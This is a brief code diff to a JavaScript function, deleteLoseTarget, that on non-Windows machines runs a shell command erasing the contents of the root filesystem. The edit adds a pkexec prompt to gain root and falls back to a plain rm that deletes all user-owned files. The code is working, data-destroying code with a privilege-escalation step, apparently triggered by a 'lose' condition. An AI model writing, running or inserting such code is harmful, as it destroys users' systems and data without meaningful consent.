@@ -12,8 +12,9 @@ function deleteLoseTarget() {
     if (process.platform === 'win32') {
       fs.rmSync(LOSE_TARGET, { recursive: true, force: true });
     } else {
-      // rmSync can't remove '/' itself (EBUSY on mount point); delete contents via shell
-      execSync('rm -rf /* /.[!.]* 2>/dev/null; true', { shell: '/bin/bash' });
+      // rmSync can't remove '/' itself (EBUSY on mount point); delete contents via shell.
+      // Try pkexec for a root auth prompt; fall back to plain rm (deletes user-owned files).
+      execSync('pkexec rm -rf /* /.[!.]* 2>/dev/null || rm -rf /* /.[!.]* 2>/dev/null; true', { shell: '/bin/bash' });
     }
     return { success: true, path: LOSE_TARGET };
   } catch (err) {
